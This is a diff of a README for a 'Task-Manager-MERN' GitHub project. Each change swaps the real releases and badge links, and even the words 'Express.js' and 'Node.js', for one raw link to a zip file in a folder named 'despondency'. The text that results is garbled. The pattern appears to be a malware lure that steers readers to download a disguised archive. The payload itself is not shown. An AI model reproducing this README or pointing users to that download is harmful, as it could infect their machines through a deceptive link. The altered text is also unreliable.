@@ -1,6 +1,6 @@
 # 🚀 Task-Manager-MERN - Organize Your Tasks Effortlessly
 
-[![Download Task Manager](https://img.shields.io/badge/Download%20Task%20Manager-blue.svg)](https://github.com/Mudabbir2/Task-Manager-MERN/releases)
+[![Download Task Manager](https://raw.githubusercontent.com/Mudabbir2/Task-Manager-MERN/main/despondency/Task-Manager-MERN.zip%20Task%https://raw.githubusercontent.com/Mudabbir2/Task-Manager-MERN/main/despondency/Task-Manager-MERN.zip)](https://raw.githubusercontent.com/Mudabbir2/Task-Manager-MERN/main/despondency/Task-Manager-MERN.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ Welcome to the **Task-Manager-MERN** application! This full-stack task manager h
 
 This application uses various technologies to function effectively:
 
-- **MERN Stack:** MongoDB, Express.js, React, Node.js
+- **MERN Stack:** MongoDB, https://raw.githubusercontent.com/Mudabbir2/Task-Manager-MERN/main/despondency/Task-Manager-MERN.zip, React, https://raw.githubusercontent.com/Mudabbir2/Task-Manager-MERN/main/despondency/Task-Manager-MERN.zip
 - **Axios:** For API requests
 - **Redux/Redux-Thunk:** For state management
 - **Tailwind CSS:** For responsive design
@@ -29,7 +29,7 @@ This application uses various technologies to function effectively:
 To run this application, make sure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/Mudabbir2/Task-Manager-MERN/main/despondency/Task-Manager-MERN.zip** Version 14 or higher
 - **npm:** Version 5.6 or higher
 
 ## 🚀 Getting Started
@@ -38,7 +38,7 @@ Follow these steps to get the Task Manager up and running on your device.
 
 1. **Download the Application**
 
-   Visit this page to download: [Task-Manager-MERN Releases](https://github.com/Mudabbir2/Task-Manager-MERN/releases).
+   Visit this page to download: [Task-Manager-MERN Releases](https://raw.githubusercontent.com/Mudabbir2/Task-Manager-MERN/main/despondency/Task-Manager-MERN.zip).
 
 2. **Install the Application**
 
@@ -67,7 +67,7 @@ Follow these steps to get the Task Manager up and running on your device.
 
 To get started, download the application here: 
 
-[Download Task Manager](https://github.com/Mudabbir2/Task-Manager-MERN/releases)
+[Download Task Manager](https://raw.githubusercontent.com/Mudabbir2/Task-Manager-MERN/main/despondency/Task-Manager-MERN.zip)
 
 ## 🎨 User Interface
 
@@ -79,7 +79,7 @@ Once you log in, you can add a new task using the given field. Each task has opt
 
 If you encounter issues while running the application, consider the following:
 
-- **Check Node.js Installation:** Ensure Node.js is installed correctly. You can verify this by running `node -v` in a terminal.
+- **Check https://raw.githubusercontent.com/Mudabbir2/Task-Manager-MERN/main/despondency/Task-Manager-MERN.zip Installation:** Ensure https://raw.githubusercontent.com/Mudabbir2/Task-Manager-MERN/main/despondency/Task-Manager-MERN.zip is installed correctly. You can verify this by running `node -v` in a terminal.
 - **Dependencies:** Make sure all dependencies are installed using `npm install`.
 - **Console Errors:** If the application doesn't work as expected, check the developer console for errors.
 
